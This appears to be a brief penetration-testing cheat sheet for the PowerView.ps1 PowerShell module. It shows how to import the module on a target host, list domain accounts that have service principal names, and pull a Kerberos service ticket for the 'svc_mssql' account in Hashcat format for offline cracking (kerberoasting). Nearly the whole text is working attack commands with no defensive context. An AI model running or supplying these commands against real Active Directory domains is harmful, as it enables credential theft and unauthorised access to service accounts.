# PowerView.ps1

this script can be utilized to tell which users are kerberoastable on the target domain.

---

## PoC

Download it on the target and import it.

```
Import-Module .\powerview.ps1
```

Retrieve kerberoastable domain users.

```
Get-DomainUser * -spn | select samaccountname
```

In order to exploit this now we can utilize the following command to retrieve the hash of the user (kerberoast the user).

```
Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat
```
